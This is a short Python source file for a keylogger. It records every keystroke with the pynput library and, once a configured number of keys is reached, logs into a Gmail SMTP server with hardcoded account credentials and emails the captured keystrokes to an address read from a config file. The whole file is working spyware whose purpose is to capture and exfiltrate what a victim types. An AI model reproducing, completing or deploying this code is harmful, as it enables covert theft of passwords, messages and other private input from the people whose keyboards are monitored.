import pynput
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from config import email, keycount

class kl:

    def __init__(self):
        self.count = 0
        self.save = []

    def on_press(self, key):
        print('[KeyLogger] Pressed {}'.format(key))

        self.save.append(key)
        self.count += 1

        if self.count >= int(keycount):
            self.write_file(self.save)
            self.save = []
            self.count -= int(keycount)
            print(f'{email} Отправлено!')

    def on_release(self, key):
        if key == Key.esc:
            return False

    def write_file(self, save):
        msg = MIMEMultipart()
        password = 'O12gjkopl3'
        login = 'klconfig05@gmail.com'
        message = f'[KeyLogger] \n{save}'
        msg.attach(MIMEText(message, 'plain'))

        server = smtplib.SMTP('smtp.gmail.com: 587')
        server.starttls()
        server.login(login, password)
        server.sendmail(login, email, msg.as_string())
        server.quit()

            
if __name__ == "__main__":
    obj = kl()
    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
        listener.join()